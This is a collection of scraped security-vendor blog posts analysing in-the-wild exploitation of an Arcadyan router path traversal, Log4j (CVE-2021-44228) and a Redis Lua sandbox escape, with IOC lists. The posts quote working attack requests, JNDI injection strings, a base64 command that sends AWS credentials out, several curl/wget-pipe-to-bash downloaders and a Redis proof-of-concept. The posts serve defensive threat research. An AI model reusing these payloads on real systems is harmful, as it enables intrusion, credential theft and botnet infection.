{"https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-08-06", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs continuously monitors in-the-wild network traffic for malicious activity. Today, we have discovered an active exploitation of a vulnerability that was disclosed just 2 days ago. CVE-2021-20090 is a vulnerability that was discovered by Tenable and made public on August 3, 2021. This vulnerability potentially affects millions of home routers (and other IOT devices using the same vulnerable code base) manufactured by no less than 17 vendors according to Tenable research, including some ISPs. The common thread between these devices seems to be firmware from Arcadyan. CVE-2021-20090 is a path traversal vulnerability that leads to an authentication bypass. When exploited, the attacker can take over control of the affected device. For example, Tenable has shown how to modify the configuration to enable telnet on a vulnerable router and gain root level shell access to the device. As of August 5, we have identified some attack patterns that attempt to exploit this vulnerability in the wild coming from an IP address located in Wuhan, Hubei province, China. The attacker seems to be attempting to deploy a Mirai variant on the affected routers using scripts similar in name to the ones mentioned by Palo Alto Networks in March. We had witnessed the same activity starting February 18. The similarity could indicate that the same threat actor is behind this new attack and attempting to upgrade their infiltration arsenal with yet another freshly disclosed vulnerability. Given that most people may not even be aware of the security risk and won’t be upgrading their device anytime soon, this attack tactic can be very successful, cheap and easy to carry out. Starting June 6, 2021, and through July 23, we have noticed this threat actor start exploiting other vulnerabilities: CVE-2020-29557 (DLink routers) CVE-2021-1497 and CVE-2021-1498 (Cisco HyperFlex) CVE-2021-31755  (Tenda AC11) CVE-2021-22502 (MicroFocus OBR) CVE-2021-22506 (MicroFocus AM) a couple more exploits from exploit-db with no related CVEs. This demon s trates that the group has been continuously adding new exploits to its arsenal . The latest CVE exploitation , CVE-2021- 20090 is probably not the last one to be added. Attack Details The initial attack originated from the IP address 27.22.80[.]19 over HTTP with the following POST method: POST /images/..%2fapply_abstract.cgi HTTP/1.1 Connection: close User-Agent: Dark action=start_ping&submit_button=ping.html&action_params=blink_time%3D5&ARC_ping_ipaddress=212.192.241.7%0A\r\nARC_SYS_TelnetdEnable=1&%0AARC_SYS_=cd+/tmp;\r\nwget+http://212.192.241.72/lolol.sh;\r\ncurl+-O+http://212.192.241.72/lolol.sh;\r\nchmod+777+lolol.sh;\r\nsh+lolol.sh&ARC_ping_status=0&TMP_Ping_Type=4 As we can see from this POST request, the attacker will modify the configuration of the attacked device to enable Telnet using “ARC_SYS_TelnetdEnable=1” then proceeds to download a new script from the IP address 212.192.241[.]72 using either wget or curl and then executes it. We obtained a copy of the payload and confirmed it is a Mirai botnet variant. It weas interesting to note that this botnet removes previous Mirai infections to clean the slate for itself. Conclusion It is clear that threat actors keep an eye on all disclosed vulnerabilities. Whenever an exploit POC is published, it often takes them very little time to integrate it into their platform and launch attacks. Most organizations do not have policies to patch within a few days, taking sometimes weeks to react. But in the case of IOT devices or home gateways, the situation is much worse as most users are not tech saavy and even those who are do not get informed about potential vulnerabilities and patches to apply. It is clear to me that the only sure way to remedy this issue is to require vendors to offer 0-down-time automatic updates. Juniper Networks Advanced Threat Protection with SecIntel provides protection against these attacks. IOCs Attack source IP: 27.22.80[.]19 Shell script and binaries downloaded from: 212.192.241[.]72 Shell script: 9793ac5afd1be5ec55476d2c205260d1b7af6db7cc29a9dc0f7fbee68a177c78  lolol.sh Dark binaries: 73edf8bfbbeaccdd84204f24402dcf488c3533be2682724e5906396b9237411d dark.arm5 8bb454cd942ce6680f083edf88ffa31661a47a45eb3681e1b36dd05043315399 dark.mips f83eadaa00e81ad51e3ab479b900b981346895b99d045a6b6f77491c3132b58c dark.m68k e4bc34e321b31926fd2fa1696136187b13864dfa03fba6848e59f9f72bfa9529 dark.sh4 80331cf89f3e6026b33b8f1bfa1c304295b9327311661d7927f78824f04cf528 dark.arm6 904f9b2e029595365f4f4426069b274810510908c7dd23a3791a831f51e9f1fc dark.mpsl 283f932f30756408a59dac97a6965eb792915242214d590eab1c6cb049148582 dark.x86 c2f5bbf35afc7335f789e420c23c43a069ecfcca1a8f9fac5cd554a7a769440e dark.arm7 70764ef9800c1d09f965fbb9698d0eda52448b23772d118f2f2c4ba37b59fc20 dark.ppc"}}
{"https://blogs.juniper.net/en-us/security/in-the-wild-log4j-attack-payloads": {"metadata": {"dateAccessed": "2022-01-06", "dateCreated": "2021-12-18", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs compiled a list of the payloads from log4j attacks we have seen as of 12/16. Most of the payloads install malware such as Muhstik, Kinsing, Mirai and Cryptominers. We have also seen installation of a file infector malware. We have also observed malicious attacks that open a reverse shell on the target, as well as attacks that attempt to dump AWS credentials. There are also a large number of benign scans coming from test or security organizations. To be able to have a better understanding of the attacks, we will briefly detail how this specific attack works. The majority of the attacks have the strings “Basic/Command/Base64/ ” or “ Basic/ReverseShell”. GET /$%7Bjndi:ldap://<redacted> /Basic/Command/Base64 / Y3VybCAtZCAiJChjYXQgfi8uYXdzL2NyZWRlbnRpYWxzKSIgaHR0cHM6Ly9jNnRkNW1lMnZ0Y<redacted> %7D HTTP/1.1 Host:<redacted> User-Agent: ${jndi:ldap://<redacted> /Basic/Command/Base64 / Y3VybCAtZCAiJChjYXQgfi8uYXdzL2NyZWRlbnRpYWxzKSIgaHR0cHM6Ly9jNnRkNW1lMnZ0YzAwMDBhcTY5MGdkcGcxNG<redacted> } GET / HTTP/1.0 User-Agent: borchuk/3.1 ${jndi:ldap://<redacted>:1389 /Basic/ReverseShell/ <redacted_ip>/9999 } Accept: */* Bearer: ${jndi:ldap://<redacted>:1389 /Basic/ReverseShell / <redacted_ip>/9999 } These attacks are initiated using a tool called “JNDIExploit”, a java-based exploitation framework that specifically targets JNDI vulnerabilities. Local JNDI vulnerabilities have existed in the past before Log4j exposed them to the outside world. At Blackhat 2016, researchers presented their paper on JNDI attacks. The JNDIExploit tool can start its own LDAP and HTTP server and is capable of receiving different types of payloads, including command execution and reverse shell. JNDIExploit usage For instance, when the URL has the “ Basic/Command” string, it will execute whatever command is in the URL after that. If the URL has the “Basic / ReverseShell ” string, it will invoke a reverse shell. It does this by dynamically generating a Java class that will perform the command and sends the location of that Java class as a response to the LDAP query. It will also host that Java class using its o wn HTTP server so that the vulnerable server can download it and thus results into remote code execution (RCE) Commands in JNDIExploit CommandTemplate.class ReverseShellTemplate.class This tool was initially deployed on GitHub in November 2020 but the original repo has been taken down; however, multiple clones of this tool resurfaced on Github. Malware Installation The following is a list of malware families we discovered that resulted from exploitation of the log4j vulnerability CVE-2021-44228. Muhstik Bot First sighting exploiting CVE-2021-44228: December 11, 2021 The attacker sends the following request to a vulnerable server whic h leads to download and execution of Exploit.class on the target. This Java class downloads ‘log ’ from 68[.]183.165.105 in Linux environments and ‘ s. cmd ’ from 172[.]105.241.146 on Windows environments using powershell . Log is a shell script that downloads multiple pty ELF files, each built for a different architecture (i.e., MIPS, ARM, Intel ) . These are variants of Muhstik bot which is the same malware targeting Confluence servers back in September . S.cmd is a powershell script that installs Monero miner and saves the earnings from the mining to this wallet “46QBumovWy4dLJ4R8wq8JwhHKWMhCaDyNDEzvxHFmAHn92EyKrttq6LfV6if5UYDAyCzh3egWXMhnfJJrEhWkMzqTPzGzsE”. Exploit.class downloads Muhstik bot when in Linux and XMRig when on Windows Here are the corresponding sha256 hashes of the downloaded files we have seen: c39eb055c5f71ebfd6881ff04e876f49495c0be5560687586fc47bf5faee0c84  pty1 33dd6c0af99455a0ca3908c0117e16a513b39fabbf9c52ba24c7b09226ad8626  pty2 4c97321bcd291d2ca82c68b02cde465371083dace28502b7eb3a88558d7e190c  pty3 b0a8b2259c00d563aa387d7e1a1f1527405da19bf4741053f5822071699795e2  pty4 2752deb9f9f9602ca0c7bd41c3171d1560b929b6a4221ab07b0bf872d042f7e7  pty5 A290b6f956ecdb3d2d2019088f0b01a93a9f680c82a4680c0fb87eb5e3e64897  log C70e6f8edfca4be3ca0dc2cfac8fddd14804b7e1e3c496214d09c6798b4620c5  s.cmd s.cmd code that installs XMRig Kinsing Malware First sighting exploiting CVE-2021-44228: December 11, 2021 The attacker in this case seems to have used the JNDIExploit tool, given the presence of “Basic/Command/Base64” in the string. The base64 encoded string is a command to download a shell script lh.sh (3ba2c4ae64be8d03747dffd5e4dc98730a54fdbb4aad50516428dc2507fdbfcf). ( curl -s 92[.]242.40.21/lh. sh || wget -q -O- 92[.]242.40.21/lh.sh)| bash The script will in turn download the Kinsing binary (6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b) from the same IP. Inside lh.sh shell script Other attacks installing Kinsing Malware are as follows: (curl -s 82[.]118.18.201/lh.sh|| wget -q -O- 82[.]118.18.201/lh.sh)|bash - base64 decoded 68cc0ae1ca1e26d5f1dba19d065291ae6c5c69c9f37b9f384245d6fa070f1d69  - Kinsing Binary Mirai First sighting exploiting CVE-2021-44228: December 15, 2021 The attack also used the JNDIExploit tool. The base64 encoded string is as follows: wget http://152[.]67.63.150/py; curl -O http://152[.]67.63.150/py; chmod 777 py; ./py rce.x86 This gets executed on the target which will download ‘py’ binary, a variant of the Mirai bot. Virus.Mikcer First sighting exploiting CVE-2021-44228: 2021-12-15 The following attack specifically targets Apache Solr based on the GET request. The attacker-controlled LDAP server sends ExecTemplateJDK8.class, which gets executed on the target. This class will download log4tst.exe using certutil from 182.131.31.122:5367. The binary is a v ariant of Virus.Mikcer ( a.k . a . Wapomi ) which is a type of file infector. This type of malware finds Windows executable program (e.g.,  .exe in ProgramFiles folder) as a host and infects it by injecting its malicious code making that file also capable of in fecting other executables. 70ffac4b8f2cf00a6876b3aa622c0efa87b53b681791302eea27692dd81f273d *ExecTemplateJDK8.class 85e88e7bdd4657422a121146600c71250d68b44a82b9677856ffda9dbec07d98 *log4tst.exe CryptoMiners First sighting exploiting CVE-2021-44228: 2021-12-11 A lot of the attacks also install CryptoMiner such as the following: They utilize the JNDIExploit tool to execute the following on the target: echo &(wget -O - http://209[.]141.58.149:8005/aa0||curl -o - http://209[.]141.58.149:8005/aa0)|/bin/bash The target downloads a shell script with filename aa0 which will then downloads an ELF binary, lz, a Monero Miner. f42915a2c76a29edd58fc2e1f7fde4c15d369e141d384064203ac57d53c41d5e *aa0 7ef631659c6f66719a18330ca3a79e89a9297681087659b8aa903c23c9e98be2 *lz Another request that leads to coinminer is the following: Reverse Shell First sighting exploiting CVE-2021-44228: December 14, 2021 We have seen attacks that try to open a reverse shell using JNDIExploit. The following request opens a reverse shell to 167[.]99.32.139:1389 Exfiltrating Sensitive Information Aside from making the target install malware, an attack can also exfiltrate sensitive information from the target. For instance, we have seen attacks that attempt to dump AWS credentials. Benign Scanning W e have also seen a significant amount of scanning that looks just like a test or done by security researchers or organizations. Binaryedge.io LeakIX Just a test where the callback is on localhost and only interested in the version of JAVA the target is using. Kryptoslogic Shifting to RMI and IIOP Most of the attacks we have seen used LDAP but recently, attackers are shifting to RMI and IIOP. We have detailed a complete chain using RMI infection in our previous blog . Attackers used the RMI protocol to install Monero Cryptominer Attackers used the IIOP protocol. Juniper Threat Labs continues to monitor attacks related to the Log4j vulnerability to share IOCs with th e community and add mitigations and protections across the suite of Juniper Networks security products. Indicators of Compromise IP Address 45[.]83.193.150 68[.]183.165.105 172[.]105.241.146 54[.]210.230.186 18[.]228.7.109 45[.]130.229.168 92[.]242.40.21 82[.]118.18.201 152[.]67.63.150 135[.]148.143.217 182[.]131.31.122 209[.]141.58.149 185[.]250.148.157 167[.]99.32.139 176[.]32.33.14 128[.]90.61.199 134[.]209.163.248 135[.]148.143.217 139[.]59.175.247 14[.]192.5.36 14[.]215.128.148 159[.]223.5.30 163[.]172.157.143 167[.]172.44.255 167[.]71.13.196 167[.]99.32.139 176[.]32.33.14 178[.]79.157.186 182[.]131.31.122 185[.]224.139.151 185[.]244.214.217 185[.]250.148.157 193[.]3.19.1 193[.]3.19.159 195[.]54.160.149 205[.]185.115.217 209[.]141.58.149 45[.]130.229.168 45[.]137.21.9 45[.]155.205.233 45[.]83.193.150 45[.]83.64.1 51[.]38.92.223 62[.]182.80.168 80[.]71.158.44 82[.]118.18.201 85[.]10.195.175 92[.]242.40.21 URL https://c6td5me2vtc0000aq690gdpg14eyyyyyb[.]interactsh.com Files c39eb055c5f71ebfd6881ff04e876f49495c0be5560687586fc47bf5faee0c84  pty1 33dd6c0af99455a0ca3908c0117e16a513b39fabbf9c52ba24c7b09226ad8626  pty2 4c97321bcd291d2ca82c68b02cde465371083dace28502b7eb3a88558d7e190c  pty3 b0a8b2259c00d563aa387d7e1a1f1527405da19bf4741053f5822071699795e2  pty4 2752deb9f9f9602ca0c7bd41c3171d1560b929b6a4221ab07b0bf872d042f7e7  pty5 A290b6f956ecdb3d2d2019088f0b01a93a9f680c82a4680c0fb87eb5e3e64897  log C70e6f8edfca4be3ca0dc2cfac8fddd14804b7e1e3c496214d09c6798b4620c5  s.cmd 3ba2c4ae64be8d03747dffd5e4dc98730a54fdbb4aad50516428dc2507fdbfcf  lh.sh 9691061f778674bb4e28fb6a2d88a2fe72711ae71f3d2f4137654e1b5e91c9d2   py 6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b  kinsing 68cc0ae1ca1e26d5f1dba19d065291ae6c5c69c9f37b9f384245d6fa070f1d69  kinsing 8ad160ddb9d617cf61ff0a7af0fa6d12ae26cf85a5d6e551c617f6c6bb770299 Exploit.class 9691061f778674bb4e28fb6a2d88a2fe72711ae71f3d2f4137654e1b5e91c9d2  mirai 70ffac4b8f2cf00a6876b3aa622c0efa87b53b681791302eea27692dd81f273d  ExecTemplateJDK8.class 85e88e7bdd4657422a121146600c71250d68b44a82b9677856ffda9dbec07d98  log4tst.exe f42915a2c76a29edd58fc2e1f7fde4c15d369e141d384064203ac57d53c41d5e  aa0 7ef631659c6f66719a18330ca3a79e89a9297681087659b8aa903c23c9e98be2  lz_coinminer e7c5b3de93a3184dc99c98c7f45e6ff5f6881b15d4a56c144e2e53e96dcc0e82  coinminer Monero Wallet 46QBumovWy4dLJ4R8wq8JwhHKWMhCaDyNDEzvxHFmAHn92EyKrttq6LfV6if5UYDAyCzh3egWXMhnfJJrEhWkMzqTPzGzsE"}}
{"https://blogs.juniper.net/en-us/threat-research/log4j-vulnerability-attackers-shift-focus-from-ldap-to-rmi": {"metadata": {"dateAccessed": "2022-01-06", "dateCreated": "2021-12-16", "source": "blogs.juniper.net"}, "text": "In a previous post , we discussed the Log4j vulnerability CVE-2021-44228 and how the exploit works when the attacker uses a Lightweight Directory Access Protocol (LDAP) service to exploit the vulnerability. Most of the initial attacks observed by Juniper Threat Labs were using the LDAP JNDI vector to inject code in the victim’s server. Since then, we’ve begun to see some threat actors shift towards using the Remote Method Invocation (RMI) API. In this post, we will describe one such attack and will discuss in detail how the attack vector leads to RCE (Remote Code Execution). RMI is a mechanism that allows an object residing in one Java Virtual Machine (JVM) to access or invoke an object running on another JVM. To facilitate this interaction, the local JVM may require Java bytecode related to the remote object. This code is downloaded from a specified remote URL and loaded into the local JVM. RMI operations are subject to additional checks and constraints by a Java security manager . However, as discussed in a 2016 Black Hat presentation , some JVM versions do not apply the same restrictions and policies to JNDI. In the present attack, the caller is running a vulnerable version of Log4j and the attacker’s server is running RMI. Below is a diagram showing how the attack unfolds. From here, we will describe each step in detail. Figure 1. Log4j RMI attack overview As in many other Log4j attacks, an exploit string is inserted into the request’s User-Agent field, where it will be processed by Log4j. This time, however, the exploit string references an RMI service rather than an LDAP service. Figure 2. HTTP POST request with Log4j exploit. As seen in this packet capture, Log4j evaluates the contents of the ${…} string and generates a call to the attacker-controlled RMI service, which returns Java code that will be executed on the targeted machine: Figure 3. Packet capture of Java code returned by the malicious RMI service In this attack, the injected code is: .getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('bash -c $@|bash . wget -qO- http://192 [ . ] 99.152.200/ ')\") This code invokes a bash shell command via the JavaScript scripting engine, using the construction “$@|bash” to execute the downloaded script. During execution of this command, the bash shell will pipe the attacker’s commands to another bash process: “wget -qO- url | bash”, which downloads and executes a shell script on the target machine. This shell script begins with comments taunting security researchers: Figure 5. Shell script downloaded and executed by the attacker This obfuscated script downloads a randomly named file of the form n .png, where n is a number between 0 and 7. Despite the purported file extension, this is actually a Monero cryptominer binary compiled for x84_64 Linux targets. The full script also adds persistence via the cron subsystem. A different attack, also detected by Juniper Threat Labs, tries both RMI and LDAP services in the same HTTP POST request in hopes that at least one will work. The LDAP injection string is sent as part of the POST command body. An exploit string in the POST body which is unlikely to succeed given most applications do not log the post body, which can be binary or very large, but by tagging the string as “username” in the JSON body, the attackers hope to exploit applications that will treat this request as a login attempt and log the failure. Figure 4. Another HTTP POST request with Log4j/RMI attack Juniper Threat Labs continues to monitor attacks related to the Log4j vulnerability and add mitigations and protections across the suite of Juniper Networks security products. IDP signatures are being continuously updated based on variations, like the ones produced by this obfuscator tool on GitHub at: https://github.com/woodpecker-appstore/log4j-payload-generator . IOCs: 7e81fc39bcc8e92a4f0c1296d38df6a10353bbe479e11e2a99a256f670aae392 c56860f50a23082849b6f06fb769f02d2a90753aa8e9397015d8df991c961644 07a3ba85d77fa2337b86266c9a615ec696b0e5c8986edccc61fa9ba6436a3639 429aeec0165384dd061456ce49fa0039229f7c464edffd62aabd6d1fbdf068f3 Attackers IPs: 82[.]102.25.253 185[.]189.160.200 144[.]48.38.174 203[.]27.106.166 Monero pools: 192[.]99.152.200 212[.]47.237.67 [2001[:]bc8:608:e01::1] [2607[:]5300:201:3100::6944]"}}
{"https://blogs.juniper.net/en-us/security/apache-log4j-vulnerability-cve-2021-44228-raises-widespread-concerns": {"metadata": {"dateAccessed": "2022-01-06", "dateCreated": "2021-12-12", "source": "blogs.juniper.net"}, "text": "Log4j is a popular logging library used in Java by a large number of applications online. To enhance its functionality from basic log formatting, Log4j added the ability to perform lookups: map lookups, system properties lookups as well as JNDI (Java Naming and Directory Interface) lookups. Log4j uses the JNDI API to obtain naming and directory services from several available service providers: LDAP (Lightweight Directory Access Protocol), COS (Common Object Services), Java RMI registry (Remote Method Invocation), DNS (Domain Name Service), etc. Description of the CVE-2021-44228 vulnerability Fig 1: Typical CVE-2021-44228 Exploitation Attack Pattern Log4j versions 2.0 through 2.14.1 have been found to be vulnerable to a Remote Code Execution vulnerability due to the fact JNDI does not protect against attacker-controlled directory service providers. Typically, a JDNI lookup would look like this: ${jndi:logging/context-name} Which allows to retrieve variables to be included in the log. But with carefully crafted data to be logged, JNDI will attempt to retrieve the variable with whatever service is presented in the log entry, for example: ${jndi:ldap://myserver.com/payload1} This log format will make JNDI retrieve the contents of payload1 from myserver.com. This can obviously be abused to provide malicious content to compromise the logging server. But how does the attacker get this string over to Log4j in the first place? The attacker has to know what is being logged by the application listening over the attacked port. For example, if the attack is on port 80 over http and the listener is a web server, the attacker knows the User-Agent string is usually logged by the server. Therefore, they would set the User-Agent string in their http request to ${jndi:ldap://myserver.com/payload1}. This is enough to trigger the vulnerability. This is just an example. Web servers log many headers, therefore one has to be careful not to focus on just User-Agent. Referrer is another header that is typically logged as well as GET, X-Remote-IP, X-Forwarded-For, etc. There are dozens of headers that are typically logged. We provide below a list of headers that we have already seen used in exploit attempts in the wild. For this attack to be complete, the attacker needs to host an “LDAP” server (which doesn’t have to be a real LDAP server at all) that will respond with the second stage payload of the attack. The response to the JNDI request will be used to build the location of the object at: http://myserver.com/payload2.class At this point, Log4j will fetch and run payload2.class in the server’s process, therefore allowing the attacker to execute this arbitrary code with the privileges of the web server’s process. Fig 2: pcap showing JTL reproduction of the attack using LDAP as an attack vector. The same approach can be used to trigger an RCE using RMI, since the attacker would reference rmi://myserver.com/payload, which is a class that will be loaded and executed by Log4j. It is unclear at this point whether a DNS service would also lead to RCE. Attacks in the wild Fig 3: Log4j requests Juniper Threat Labs has seen over the past 3 days. Juniper Threat Labs has been seeing some amount of scanning looking for vulnerable servers. A common method used by attackers is inserting the malicious request in the User-Agent header as most web servers will log this field to identify the browsers connecting to them. But we have also seen attacks where the malicious requests are injected in different headers such as the ones below: User-Agent: Authorization: CF-Connecting_IP: Client-IP: Contact: Cookie: Forwarded-For-Ip: Forwarded-For: Forwarded: From: Originating-IP: Proxy-Client-IP: Referer: True-Client-IP: X-Api-Version: X-Client-IP: X-Client-Ip: X-Forwarded-For: X-Host: X-Originating-Ip: X-Real-IP: X-Remote-Addr: X-Remote-Ip: X-Wap-Profile: In addition to the straightforward attacks, we have also seen some connections that attempt to obfuscate the requests such as using {lower: } or {upper:} in the request: Or using an HTTP post command and burying the malicious request in the POST body: This POST form would probably not succeed at exploiting this Log4j vulnerability in most situations because POST body is usually not logged. Given the port number used (8983), this seems to be targeting Apache SOLR enterprise search platform, which does not log POST bodies. Resolution Apache has released Log4j version 2.15 which contains a fix for this CVE. It is recommended to immediately upgrade to this version. Mitigation If you cannot upgrade to the fixed version of Log4j, you can mitigate this vulnerability as follows: For versions 2.0 and before 2.10, Apache recommends removing the Jndi Lookup class from the classpath by running zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class For versions 2.10 and above, set the system property formatMsgNoLookups to true or set the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true . If you cannot do any of the above, you can block all outbound LDAP or RMI connections using Application Identity filters. Juniper SRX NG Firewall provides AppID signatures for both protocols. Juniper Cloud Workload Protection customers already have native detection for this attack on protected applications and can block it. In the example below, you can see that Juniper’s CWP is detecting the LDAP remote access request as suspicious because it was initiated from content that was provided to the application via data input. Juniper SRX Next Gen Firewall customers can block these attacks with the IDP sig pack #3444 (Enhanced in #3445), but there is always a chance of variations that are not handled by existing signatures. Juniper Threat Labs is keeping an eye on all the variations that show up and will immediately spin up enhanced signatures when needed. Attack Variations Seen in the Wild A number of these attacks are probes by security researchers, but unfortunately we have to consider them as potentially malicious until proven otherwise. Threat actors also mimic threat researchers in hopes of hiding in the grey noise. Attack 1 Attack 2 Attack 3 Attack 4 This attack installs a linux Cryptominer e7c5b3de93a3184dc99c98c7f45e6ff5f6881b15d4a56c144e2e53e96dcc0e82 Attack 5 Attack 6 Attack 7 Indicators of Compromise 163[.]172[.]157[.]143:1389 185[.]250[.]148[.]157:1389 32fce0c1f193[.]bingsearchlib[.]com:39356 45[.]130[.]229[.]168:1389 45[.]155[.]205[.]233:12344 45[.]83[.]193[.]150:1389 92[.]242[.]40[.]21:5557 176[.]32[.]33[.]14 c6pa7pkpu896ceftu3j0cg3kemayys8b1[.]interactsh[.]com remoteflipside[.]com:80"}}
{"https://blogs.juniper.net/en-us/security/muhstik-gang-targets-redis-servers": {"metadata": {"dateAccessed": "2022-04-03", "dateCreated": "2022-03-25", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs has uncovered an attack that targets Redis Servers using a recently disclosed vulnerability, namely CVE-2022-0543. This vulnerability exists in some Redis Debian packages. The attack started on March 11, 2022 from the same threat actor we’ve seen targeting confluence servers back in September 2021 and the same group targeting Log4j back in December. The payload used is a variant of Muhstik bot that can be used to launch DDOS attacks CVE-2022-0543: Redis Lua Sandbox Escape and Remote Code Execution “ Redis is a very widely used service for caching, but it’s also used as a message broker. Clients talk to a Redis server over a socket, send commands, and the server changes its state (i.e. its in-memory structures), in response to such commands. Redis embeds the Lua programming language as its scripting engine, which is made available through the eval command. The Lua engine is expected to be sandboxed , i.e., clients can interact with the Redis APIs from Lua, but should not be able to execute arbitrary code on the machine where Redis is running.“ – Reginaldo Silva In January 2022, Reginaldo Silva discovered a vulnerability in Redis (Debian-specific) that allows Lua sandbox escape. A remote attacker with the ability to execute arbitrary Lua scripts could escape the Lua sandbox and execute arbitrary code on the host. This vulnerability existed because the Lua library in some Debian/Ubuntu packages is provided as a dynamic library (Ubuntu Bionic and Trusty are not affected). When the Lua interpreter initializes, the “ package ” variable is automatically populated, and that in turn permitted access to arbitrary Lua functionality. For instance, we can use “ package.loadlib” to load the modules from “ liblua ” library, then use this module to execute commands. The following is a proof of concept on how to exploit this vulnerability. local io_l = package.loadlib (\"/ usr /lib/x86_64-linux-gnu/liblua5.1.so.0\", \" luaopen_io \" ); local io = io_l (); local f = io.popen (\" cat / etc /passwd \", \"r\"); local res = f:read(\"*a\"); f:close(); return res To demonstrate this attack, we instantiated a vulnerable Redis server and launched the above Lua scripts using the “ eval ” command. As you can observe from the screenshot below, we are able to achieve code execution by dumping the contents of / etc /passwd . Proof of concept of executing system commands inside the Redis session Payload: Muhstik bot timeline of attacks on CVE-2022-0543 On March 11, Juniper Threat Labs observed attacks launching this exploit from our telemetry. The attack attempts to download “ russia. sh ” using wget or curl from “ 106[.]246.224.219 ”. It saves it as “ / tmp / russ ” and executes it. eval 'local io_l = package.loadlib (\"/ usr /lib/x86_64-linux-gnu/liblua5.1.so.0\", \" luaopen_io \"); \r\nlocal io = io_l (); \r\nlocal f = io.popen (\"( wget -O / tmp / russ http://106[.]246.224.219/russia.sh || curl -o / tmp / russ http://106[.].246.224.219/russia.sh ); chmod 700 / tmp / russ ; / tmp / russ \" , \"r\"); \r\nlocal res = f:read (\"*a\"); f:close (); return res' 0 contents of russia.sh This script (russia.sh) will further download and execute linux binaries from 160[.]16.58.163. These binaries are identified to be variants of Muhstik bot. This bot connects to an IRC server to receive commands which include the following: Download files Shell commands Flood attacks SSH brute force Strings inside Muhstik bot indicating its capabilities Threat Actor We mapped the originating IP of these attacks to figure out if these are related to some groups we are tracking. We found that the following IPs was used in the past to launch attacks: 170[.]210.45.163 191[.]232.38.25 79[.]172.212.132 For instance, the IP 191.232.38.25 was used in September 2021 to launch attacks on Confluence Servers exploiting CVE-2021-26084. We have documented that attack here . It’s worth noting that the group is still using the same Muhstik bot. The same IP was again used in December to launch attacks on Apache Log4j. Timeline of observed attacks launched from 191[.]232.38.25 Conclusion We advise those who may be vulnerable to patch their Redis service. Debian and Ubuntu have also released security advisories regarding this matter. Links are below: Debian Advisory Ubuntu Advisory Indicators of Compromise 4817893f8e724cbc5186e17f46d316223b7683dcbc9643e364b5913f8d2a9197  pty1 46389c117c5f41b60e10f965b3674b3b77189b504b0aeb5c2da67adf55a7129f  pty10 95d1fca8bea30d9629fdf05e6ba0fc6195eb0a86f99ea021b17cb8823db9d78b  pty2 7d3855bb09f2f6111d6c71e06e1e6b06dd47b1dade49af0235b220966c2f5be3  pty3 16b4093813e2923e9ee70b888f0d50f972ac607253b00f25e4be44993d263bd2  pty4 28443c0a9bfd8a12c12a2aad3cc97d2e8998a9d8825fcf3643d46012f18713f0  pty5 36a2ac597030f3f3425153f5933adc3ca62259c35f687fde5587b8f5466d7d54  russia.sh Download IP 106[.]246.224.219 160[.]16.58.163 Attacker IP 104[.]236.150.159 170[.]210.45.163 146[.]185.136.187 178[.]62.69.4 191[.]232.38.25 79[.]172.212.132 221[.]120.103.253 Reference: https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543 https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543"}}
